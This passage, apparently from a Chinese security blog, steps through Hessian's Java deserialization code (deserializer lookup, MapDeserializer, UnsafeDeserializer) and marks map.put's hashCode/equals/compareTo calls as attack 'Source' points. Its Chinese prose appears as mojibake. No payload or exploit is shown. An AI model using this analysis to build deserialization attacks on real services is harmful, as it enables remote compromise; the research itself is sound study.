&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) æœªå‘½ä¸­åˆ™åŠ è½½</span></span><br><span class="line">    deserializer = loadDeserializer(cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) æ‡’åˆå§‹åŒ–ç¼“å­˜å¹¶å†™å…¥</span></span><br><span class="line">    <span class="keyword">if</span> (_cachedDeserializerMap == <span class="literal">null</span>) &#123;</span><br><span class="line">        _cachedDeserializerMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>(<span class="number">8</span>); <span class="comment">// åˆå§‹å®¹é‡ 8</span></span><br><span class="line">    &#125;</span><br><span class="line">    _cachedDeserializerMap.put(cl, deserializer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å®é™…åŠ è½½æŒ‡å®šç±»çš„ååºåˆ—åŒ–å™¨ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æŸ¥æ‰¾é¡ºåºï¼ˆä»é«˜åˆ°ä½ä¼˜å…ˆçº§ï¼‰ï¼š</span></span><br><span class="line"><span class="comment"> * 1) å¤–æŒ‚å·¥å‚é“¾ _factoriesï¼ˆè‡ªå®šä¹‰å·¥å‚ï¼ŒæŒ‰æ·»åŠ é¡ºåºæŸ¥è¯¢ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 2) å½“å‰ä¸Šä¸‹æ–‡å·¥å‚ _contextFactoryï¼ˆåŸºäºå½“å‰ ContextClassLoaderï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 3) åŸºäºç›®æ ‡ç±» cl çš„ ClassLoader åˆ›å»ºçš„ ContextSerializerFactoryï¼ˆæˆ–ç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ï¼š</span></span><br><span class="line"><span class="comment"> *    3.1) factory.getDeserializer(cl.getName())</span></span><br><span class="line"><span class="comment"> *    3.2) factory.getCustomDeserializer(cl)</span></span><br><span class="line"><span class="comment"> * 4) æ ‡å‡†ç±»å‹åˆ†æ”¯ï¼ˆæ— éœ€å¤–éƒ¨æ³¨å†Œï¼‰ï¼š</span></span><br><span class="line"><span class="comment"> *    - Collection  â†’ CollectionDeserializer</span></span><br><span class="line"><span class="comment"> *    - Map         â†’ MapDeserializer</span></span><br><span class="line"><span class="comment"> *    - Iterator    â†’ IteratorDeserializer</span></span><br><span class="line"><span class="comment"> *    - Annotation  â†’ AnnotationDeserializer</span></span><br><span class="line"><span class="comment"> *    - Interface   â†’ ObjectDeserializerï¼ˆåŸºäºæ¥å£ç”ŸæˆåŠ¨æ€ä»£ç†/å ä½ï¼‰</span></span><br><span class="line"><span class="comment"> *    - Array       â†’ ArrayDeserializer(componentType)</span></span><br><span class="line"><span class="comment"> *    - Enumeration â†’ EnumerationDeserializer</span></span><br><span class="line"><span class="comment"> *    - Enum        â†’ EnumDeserializer</span></span><br><span class="line"><span class="comment"> *    - Class       â†’ ClassDeserializerï¼ˆç”¨äºååºåˆ—åŒ– Class&lt;?&gt;ï¼‰</span></span><br><span class="line"><span class="comment"> * 5) å…œåº•ç­–ç•¥ï¼šgetDefaultDeserializer(cl)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl ç›®æ ‡ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ååºåˆ—åŒ–å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> HessianProtocolException åè®®/è§£æç›¸å…³å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Deserializer <span class="title function_">loadDeserializer</span><span class="params">(Class cl)</span> <span class="keyword">throws</span> HessianProtocolException &#123;</span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) éå†å¤–æŒ‚å·¥å‚é“¾ï¼ˆç”¨æˆ·è‡ªå®šä¹‰çš„ AbstractSerializerFactoryï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         deserializer == <span class="literal">null</span> &amp;&amp; _factories != <span class="literal">null</span> &amp;&amp; i &lt; _factories.size();</span><br><span class="line">         i++) &#123;</span><br><span class="line">        <span class="type">AbstractSerializerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> (AbstractSerializerFactory) _factories.get(i);</span><br><span class="line">        deserializer = factory.getDeserializer(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) ä½¿ç”¨â€œå½“å‰ä¸Šä¸‹æ–‡â€å·¥å‚ï¼ˆä¸ _contextFactory ç»‘å®šçš„ ClassLoaderï¼‰</span></span><br><span class="line">    <span class="comment">// <span class="doctag">XXX:</span> need testï¼ˆåŸæ³¨é‡Šä¿ç•™ï¼‰</span></span><br><span class="line">    deserializer = _contextFactory.getDeserializer(cl.getName());</span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) é’ˆå¯¹ç›®æ ‡ç±»çš„ ClassLoader å†åˆ›å»ºä¸€ä¸ª ContextSerializerFactoryï¼ˆæˆ–é€€å›ç³»ç»Ÿ CLï¼‰</span></span><br><span class="line">    <span class="type">ContextSerializerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cl.getClassLoader() != <span class="literal">null</span>) &#123;</span><br><span class="line">        factory = ContextSerializerFactory.create(cl.getClassLoader());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        factory = ContextSerializerFactory.create(_systemClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.1) å…ˆæŒ‰ç±»åè·å–</span></span><br><span class="line">    deserializer = factory.getDeserializer(cl.getName());</span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2) å†å°è¯•â€œè‡ªå®šä¹‰â€ååºåˆ—åŒ–å™¨ï¼ˆå¯èƒ½åŸºäºæ³¨è§£/ä»£ç ç”Ÿæˆç­‰ï¼‰</span></span><br><span class="line">    deserializer = factory.getCustomDeserializer(cl);</span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> deserializer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) æ ‡å‡†ç±»å‹åˆ†æ”¯ï¼ˆæ— éœ€æ³¨å†Œçš„å†…å»ºå¤„ç†ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (Collection.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">CollectionDeserializer</span>(cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Iterator.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = IteratorDeserializer.create();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Annotation.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">AnnotationDeserializer</span>(cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isInterface()) &#123;</span><br><span class="line">        <span class="comment">// æ¥å£ç±»å‹ï¼šä½¿ç”¨ ObjectDeserializerï¼ˆå¸¸ç”¨äºå°† Mapâ†’Bean æˆ–ç”Ÿæˆä»£ç†ï¼‰</span></span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">ObjectDeserializer</span>(cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">ArrayDeserializer</span>(cl.getComponentType());</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Enumeration.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = EnumerationDeserializer.create();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Enum.class.isAssignableFrom(cl)) &#123;</span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">EnumDeserializer</span>(cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Class.class.equals(cl)) &#123;</span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–ä¸º Class&lt;?&gt;ï¼Œéœ€è¦å¯ç”¨çš„ ClassLoader</span></span><br><span class="line">        deserializer = <span class="keyword">new</span> <span class="title class_">ClassDeserializer</span>(getClassLoader());</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 5) å…œåº•ï¼šé»˜è®¤ååºåˆ—åŒ–å™¨ï¼ˆé€šå¸¸æ˜¯åŸºäºåå°„çš„ Bean ååºåˆ—åŒ–ï¼‰</span></span><br><span class="line">        deserializer = getDefaultDeserializer(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="Map-ç±»å‹ååºåˆ—åŒ–"><a href="#Map-ç±»å‹ååºåˆ—åŒ–" class="headerlink" title="Map ç±»å‹ååºåˆ—åŒ–"></a>Map ç±»å‹ååºåˆ—åŒ–</h4><p>å¯¹äº <code>Map</code> ç±»å‹è·å–åˆ°çš„æ˜¯ <code>com.caucho.hessian.io.MapDeserializer</code>ï¼Œè¯¥ååºåˆ—åŒ–å™¨çš„ <code>readMap</code> æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ª <code>Map</code> å®ä¾‹ï¼Œç„¶åå°†åºåˆ—åŒ–æ•°æ®ä¸­è§£æå‡ºçš„é”®å€¼å¯¹å­˜æ”¾åˆ°è¿™ä¸ª <code>Map</code> å®ä¾‹ä¸­ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» Hessian è¾“å…¥æµè¯»å–ä¸€ä¸ª Mapï¼ˆé”®å€¼å¯¹ï¼‰å¹¶è¿”å›å¯¹åº”çš„ Java Map å®ä¾‹ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å¤„ç†ç­–ç•¥ï¼š</span></span><br><span class="line"><span class="comment"> * 1) æ ¹æ®å£°æ˜çš„ç›®æ ‡ç±»å‹ _type é€‰æ‹©å…·ä½“å®ç°ï¼š</span></span><br><span class="line"><span class="comment"> *    - _type == null                   â†’ ä½¿ç”¨ HashMap</span></span><br><span class="line"><span class="comment"> *    - _type ç­‰äº Map.class             â†’ ä½¿ç”¨ HashMap</span></span><br><span class="line"><span class="comment"> *    - _type ç­‰äº SortedMap.class       â†’ ä½¿ç”¨ TreeMap</span></span><br><span class="line"><span class="comment"> *    - å…¶ä»–æƒ…å†µ                          â†’ é€šè¿‡ _ctor åå°„æ— å‚æ„é€ æŒ‡å®šçš„ Map å®ç°</span></span><br><span class="line"><span class="comment"> * 2) å°†æ–°å»ºçš„ map è°ƒç”¨ in.addRef(map) åŠ å…¥å¼•ç”¨è¡¨ï¼Œæ”¯æŒåç»­çš„å¼•ç”¨è§£æï¼ˆå¾ªç¯/å…±äº«å¯¹è±¡åœºæ™¯ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> * 3) æŒç»­è¯»å– key/value å¯¹ï¼ˆin.readObject()ï¼‰ï¼Œç›´åˆ°é‡åˆ°ç»“æŸæ ‡è®°ï¼ˆin.isEnd() ä¸º trueï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> * 4) è°ƒç”¨ in.readEnd() æ¶ˆè´¹ç»“æŸæ ‡è®°å¹¶å®Œæˆè¯¥æ®µç»“æ„çš„è¯»å–ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in Hessian è¾“å…¥</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ååºåˆ—åŒ–å¾—åˆ°çš„ Map å®ä¾‹ï¼ˆä½œä¸º Object è¿”å›ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å–æˆ–åå°„å¤±è´¥æ—¶æŠ›å‡ºï¼ˆåå°„å¼‚å¸¸è¢«åŒ…è£…ä¸º IOExceptionWrapperï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) é€‰æ‹©å…·ä½“çš„ Map å®ç°ç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span> (_type == <span class="literal">null</span>) &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(Map.class)) &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(SortedMap.class)) &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡é¢„å…ˆè§£æå¥½çš„æ— å‚æ„é€ å™¨ _ctor åˆ›å»ºç›®æ ‡ç±»å‹å®ä¾‹</span></span><br><span class="line">            map = (Map) _ctor.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// å°†åå°„å¤±è´¥åŒ…è£…ä¸º IO å¼‚å¸¸æŠ›å‡º</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) å°†è¯¥ Map æ”¾å…¥å¼•ç”¨è¡¨ï¼Œä¾¿äºåç»­ &#x27;R&#x27;ï¼ˆreferenceï¼‰æ ‡ç­¾çš„åå‘å¼•ç”¨è§£æ</span></span><br><span class="line">    in.addRef(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) è¯»å–é”®å€¼å¯¹ç›´åˆ°é‡åˆ°ç»“æŸæ ‡è®°</span></span><br><span class="line">    <span class="keyword">while</span> (!in.isEnd()) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> in.readObject();    <span class="comment">// è¯»å– keyï¼ˆåŠ¨æ€ç±»å‹ï¼‰</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> in.readObject();  <span class="comment">// è¯»å– valueï¼ˆåŠ¨æ€ç±»å‹ï¼‰</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) æ¶ˆè´¹ç»“æŸæ ‡è®°ï¼Œå®Œæˆè¯¥ Map ç»“æ„çš„è¯»å–</span></span><br><span class="line">    in.readEnd();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>map.put</code> ä¼šè§¦å‘å¦‚ä¸‹æ“ä½œï¼Œå¯ä½œä¸ºååºåˆ—åŒ–çš„ Source ç‚¹ã€‚</p>
<ul>
<li>å¯¹äº <code>HashMap</code> ä¼šè§¦å‘ <code>key.hashCode()</code>ã€<code>key.equals(k)</code>ï¼›</li>
<li>å¯¹äº <code>TreeMap</code> ä¼šè§¦å‘ <code>key.compareTo()</code>ã€‚</li>
</ul>
<h4 id="æ™®é€šç±»ååºåˆ—åŒ–"><a href="#æ™®é€šç±»ååºåˆ—åŒ–" class="headerlink" title="æ™®é€šç±»ååºåˆ—åŒ–"></a>æ™®é€šç±»ååºåˆ—åŒ–</h4><p>å¯¹äºè‡ªå®šä¹‰ç±»å‹ï¼Œåœ¨ <code>readObject</code> æ–¹æ³•ä¸­ä¼šèµ° <code>M</code> åˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯è¯´ Hessian æŠŠæ™®é€šç±»å¯¹è±¡å½“æˆ <code>Map</code> æ¥å¤„ç†äº†ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">    <span class="comment">// Map/å¯¹è±¡ï¼šå¯å¸¦â€œå£°æ˜ç±»å‹â€</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// äº¤ç”±åºåˆ—åŒ–å·¥å‚æ ¹æ®ç±»å‹ååºåˆ—åŒ–ï¼ˆå¯èƒ½æ˜ å°„ä¸º Java Bean/Map ç­‰ï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œ <code>readType</code> å¾—åˆ°çš„ <code>type</code> æ˜¯ç±»çš„å®Œæ•´åç§°ï¼Œå› æ­¤ <code>MapDeserializer#readMap</code> å‡½æ•°ä¼šè°ƒç”¨åˆ° <code>getDefaultDeserializer</code> è·å–é»˜è®¤çš„ååºåˆ—åŒ–å™¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›æœªè¢«ç›´æ¥åŒ¹é…åˆ°çš„ç±»çš„â€œé»˜è®¤ååºåˆ—åŒ–å™¨â€ï¼ˆDeserializerï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * é€‰æ‹©æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) è‹¥ç±»å‹æ˜¯ InputStreamï¼Œåˆ™ä½¿ç”¨åŸºäºæµçš„ååºåˆ—åŒ–å™¨ï¼›</span></span><br><span class="line"><span class="comment"> * 2) è‹¥å¼€å¯äº†â€œä¸å®‰å…¨â€ååºåˆ—åŒ–é€‰é¡¹ï¼ˆå¯èƒ½è·³è¿‡éƒ¨åˆ†æ„é€ ä¸æ£€æŸ¥ï¼‰ï¼Œåˆ™ä½¿ç”¨ UnsafeDeserializerï¼›</span></span><br><span class="line"><span class="comment"> * 3) å¦åˆ™å›é€€åˆ°å¸¸è§„çš„ JavaDeserializerã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åº”ç”¨å¯é‡å†™æœ¬æ–¹æ³•ï¼Œä»¥ä¾¿å°†é»˜è®¤ç­–ç•¥åˆ‡æ¢ä¸º Bean é£æ ¼è€Œéå­—æ®µååºåˆ—åŒ–ç­‰è‡ªå®šä¹‰è¡Œä¸ºã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl éœ€è¦ååºåˆ—åŒ–çš„ç›®æ ‡ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>   å¯¹åº”çš„ Deserializer å®ä¾‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Deserializer <span class="title function_">getDefaultDeserializer</span><span class="params">(Class cl)</span> &#123;</span><br><span class="line">    <span class="comment">// ç‰¹ä¾‹ï¼šè¾“å…¥æµç±»å‹ï¼Œç›´æ¥ä½¿ç”¨æµååºåˆ—åŒ–å™¨</span></span><br><span class="line">    <span class="keyword">if</span> (InputStream.class.equals(cl)) &#123;</span><br><span class="line">        <span class="keyword">return</span> InputStreamDeserializer.DESER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®é…ç½®é€‰æ‹© Unsafe ç‰ˆæœ¬æˆ–å¸¸è§„ Java ç‰ˆæœ¬çš„ååºåˆ—åŒ–å™¨</span></span><br><span class="line">    <span class="keyword">if</span> (_isEnableUnsafeSerializer) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnsafeDeserializer</span>(cl, _fieldDeserializerFactory);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaDeserializer</span>(cl, _fieldDeserializerFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é»˜è®¤ååºåˆ—åŒ–å™¨ä¸º <code>UnsafeDeserializer</code>ï¼Œåœ¨å…¶æ„é€ å‡½æ•°é‡Œï¼Œä¼šå¯¹ç±»æˆå‘˜åˆ†é…æˆå‘˜çš„ååºåˆ—åŒ–å™¨ï¼Œå¹¶æ”¾å…¥ <code>HashMap&lt;String,FieldDeserializer2&gt; _fieldMap</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°ï¼šåŸºäºç»™å®šç±»å‹ä¸å­—æ®µååºåˆ—åŒ–å·¥å‚ï¼Œåˆ›å»ºâ€œä¸å®‰å…¨â€ååºåˆ—åŒ–å™¨ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl           ç›®æ ‡ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldFactory å­—æ®µååºåˆ—åŒ–å™¨å·¥å‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnsafeDeserializer</span><span class="params">(Class&lt;?&gt; cl, FieldDeserializer2Factory fieldFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// ä¿å­˜ç›®æ ‡ç±»å‹</span></span><br><span class="line">    _type = cl;</span><br><span class="line">    <span class="comment">// æ„å»ºå­—æ®µå -&gt; å­—æ®µååºåˆ—åŒ–å™¨ çš„æ˜ å°„ï¼ˆåŒ…å«çˆ¶ç±»å±‚æ¬¡ï¼‰</span></span><br><span class="line">    _fieldMap = getFieldMap(cl, fieldFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åå°„æŸ¥æ‰¾ readResolve æ–¹æ³•ï¼ˆè‹¥å­˜åœ¨ï¼Œç”¨äºååºåˆ—åŒ–åå¯¹è±¡æ›¿æ¢ï¼‰</span></span><br><span class="line">    _readResolve = getReadResolve(cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_readResolve != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å…³é—­è®¿é—®æ£€æŸ¥ï¼ˆåœ¨ JDK 9+ ä¸‹å¯èƒ½éœ€è¦æ¨¡å—å¼€æ”¾ï¼‰</span></span><br><span class="line">        _readResolve.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å’ŒåŸç”Ÿååºåˆ—åŒ–ä¸€æ ·ï¼Œä¼šè·³è¿‡ <code>static</code> å’Œ <code>transient</code> ä¿®é¥°çš„å­—æ®µã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸ºç±»ï¼ˆåŠå…¶çˆ¶ç±»ï¼‰åˆ›å»ºå­—æ®µååºåˆ—åŒ–æ˜ å°„ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * éå†ç±»å±‚çº§ï¼Œä»å½“å‰ç±»ä¸€ç›´åˆ° Objectï¼š</span></span><br><span class="line"><span class="comment"> * - è·³è¿‡ transient / static å­—æ®µï¼›</span></span><br><span class="line"><span class="comment"> * - è‹¥å­ç±»å·²æ”¾å…¥åŒåå­—æ®µæ¡ç›®ï¼Œåˆ™ä¸è¦†ç›–ï¼›</span></span><br><span class="line"><span class="comment"> * - å…¶ä½™å­—æ®µäº¤ç”±å·¥å‚åˆ›å»º FieldDeserializer2 åæ”¾å…¥æ˜ å°„ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl           èµ·å§‹ç±»</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldFactory å­—æ®µååºåˆ—åŒ–å™¨å·¥å‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>             